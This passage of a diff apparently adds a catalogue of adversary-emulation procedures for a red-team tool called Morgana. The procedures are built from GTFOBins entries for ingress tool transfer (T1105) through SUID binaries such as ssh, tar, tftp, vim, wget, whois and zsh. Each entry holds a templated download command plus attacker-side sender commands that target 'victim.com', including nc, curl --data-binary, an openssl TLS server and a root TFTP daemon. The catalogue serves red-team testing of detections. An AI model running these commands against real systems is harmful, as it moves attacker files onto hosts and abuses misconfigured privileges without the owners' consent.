+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "tcp-server"
+        },
+        "operator_notes": {
+          "sender": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:socat:download:0:suid::",
+        "source_name": "socat",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `socat` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:ssh:download:0:suid::",
+      "name": "GTFOBINS - T1105 - ssh - Download - Suid [f520112]",
+      "description": "This executable can download remote data. Binary: ssh. Context: SUID.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "ssh user@#{lotl_gtfobins_remote_host} 'cat #{lotl_gtfobins_input_file}\"",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/ssh",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/ssh",
+        "source_bin": "ssh",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "ssh-server"
+        },
+        "operator_notes": {
+          "sender": "ssh-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:ssh:download:0:suid::",
+        "source_name": "ssh",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `ssh` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:tar:download:0:suid::",
+      "name": "GTFOBINS - T1105 - tar - Download - Suid [543c5ff]",
+      "description": "This executable can download remote data. Binary: tar. Context: SUID. The attacker box must have the `rmt` utility installed.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "tar xvf user@#{lotl_gtfobins_remote_host}:#{lotl_gtfobins_input_file}.tar --rsh-command=/bin/ssh",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/tar",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/tar",
+        "source_bin": "tar",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "ssh-server",
+          "version": "GNU"
+        },
+        "operator_notes": {
+          "sender": "ssh-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:tar:download:0:suid::",
+        "source_name": "tar",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `tar` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:tftp:download:0:suid::",
+      "name": "GTFOBINS - T1105 - tftp - Download - Suid [31018a8]",
+      "description": "This executable can download remote data. Binary: tftp. Context: SUID.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "tftp #{lotl_gtfobins_remote_host}\nget #{lotl_gtfobins_input_file}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/tftp",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/tftp",
+        "source_bin": "tftp",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": {
+            "code": "atftpd --no-fork --verbose --daemon --no-fork --user root.root .",
+            "comment": "A TFTP server can be used on the attacker box to send the data."
+          }
+        },
+        "operator_notes": {
+          "sender": {
+            "code": "atftpd --no-fork --verbose --daemon --no-fork --user root.root .",
+            "comment": "A TFTP server can be used on the attacker box to send the data."
+          }
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:tftp:download:0:suid::",
+        "source_name": "tftp",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `tftp` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:vim:download:0:suid:1:vim>lua",
+      "name": "GTFOBINS - T1105 - vim - Download - Suid [d184fe6]",
+      "description": "This executable can download remote data. Binary: vim. Context: SUID. This allows to run Lua code (`...`). Inherits download behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "vim -c ':lua ...'\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"#{lotl_gtfobins_output_file}\", \"wb\");\n  f:write(d);\n  io.close(f);'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/vim",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/vim",
+        "source_bin": "vim",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "vim",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "vim",
+            "lua"
+          ],
+          "inherit_index": 1
+        },
+        "operator_notes": {
+          "sender": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:vim:download:0:suid:1:vim>lua",
+        "source_name": "vim",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `vim` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:vim:download:0:suid:0:vim>python",
+      "name": "GTFOBINS - T1105 - vim - Download - Suid [ea70019]",
+      "description": "This executable can download remote data. Binary: vim. Context: SUID. This allows to run Python code (`...`). Inherits download behavior from python.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "vim -c ':py ...'\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(\"http://#{lotl_gtfobins_remote_host}#{lotl_gtfobins_input_file}\", \"#{lotl_gtfobins_output_file}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/vim",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/vim",
+        "source_bin": "vim",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "vim",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "http-server",
+          "inherited_from": "python",
+          "inheritance_path": [
+            "vim",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "sender": "http-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:vim:download:0:suid:0:vim>python",
+        "source_name": "vim",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `vim` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:volatility:download:0:suid:0:volatility>python",
+      "name": "GTFOBINS - T1105 - volatility - Download - Suid [ba20387]",
+      "description": "This executable can download remote data. Binary: volatility. Context: SUID. Inherits download behavior from python.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "volatility -f /path/to/core-dump volshell\n...\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(\"http://#{lotl_gtfobins_remote_host}#{lotl_gtfobins_input_file}\", \"#{lotl_gtfobins_output_file}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/volatility",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/volatility",
+        "source_bin": "volatility",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "volatility",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "http-server",
+          "inherited_from": "python",
+          "inheritance_path": [
+            "volatility",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "sender": "http-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:volatility:download:0:suid:0:volatility>python",
+        "source_name": "volatility",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `volatility` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:wget:download:0:suid::",
+      "name": "GTFOBINS - T1105 - wget - Download - Suid [901a23d]",
+      "description": "This executable can download remote data. Binary: wget. Context: SUID.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "wget http://#{lotl_gtfobins_remote_host}#{lotl_gtfobins_input_file} -O #{lotl_gtfobins_output_file}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file",
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/wget",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/wget",
+        "source_bin": "wget",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "http-server"
+        },
+        "operator_notes": {
+          "sender": "http-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:wget:download:0:suid::",
+        "source_name": "wget",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `wget` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:whois:download:0:suid::",
+      "name": "GTFOBINS - T1105 - whois - Download - Suid [1e6cdcb]",
+      "description": "This executable can download remote data. Binary: whois. Context: SUID. Received data has instances of the `\\r` byte stripped.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "whois -h #{lotl_gtfobins_remote_host} -p #{lotl_gtfobins_remote_port} x",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/whois",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/whois",
+        "source_bin": "whois",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "sender": "tcp-server"
+        },
+        "operator_notes": {
+          "sender": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:whois:download:0:suid::",
+        "source_name": "whois",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `whois` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:zsh:download:0:suid::",
+      "name": "GTFOBINS - T1105 - zsh - Download - Suid [332fc17]",
+      "description": "This executable can download remote data. Binary: zsh. Context: SUID.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "zsh -c 'zmodload zsh/net/tcp;ztcp #{lotl_gtfobins_remote_host} #{lotl_gtfobins_remote_port};echo -n \"$(<&$REPLY)\" >#{lotl_gtfobins_output_file}'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_output_file",
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/zsh",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/zsh",
+        "source_bin": "zsh",
+        "function": "download",
+        "function_label": "Download",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "binary": {
+            "false": "The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data."
+          },
+          "sender": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to send the data.",
+              "code": "nc victim.com 12345 </path/to/input-file"
+            },
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to send the data.",
+              "code": "nc -l -p 12345 </path/to/input-file"
+            },
+            "http-client": {
+              "comment": "An HTTP client can be used on the attacker box to send the data.",
+              "code": "curl victim.com --data-binary @/path/to/input-file"
+            },
+            "http-server": {
+              "comment": "An HTTP server can be used on the attacker box to send the data.",
+              "code": "python -m http.server 80"
+            },
+            "ftp-server": {
+              "comment": "An FTP server can be used on the attacker box to send the data.",
+              "code": "python -m pyftpdlib -w -p 21"
+            },
+            "ssh-server": {
+              "comment": "An SSH server can be used on the attacker box to send the data."
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to send the data.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "binary": false,
+          "sender": "tcp-server"
+        },
+        "operator_notes": {
+          "sender": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:zsh:download:0:suid::",
+        "source_name": "zsh",
+        "source_tcodes": [
+          "T1105"
+        ],
+        "category": "download",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `zsh` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    }
+  ],
+  "chains": []
+}
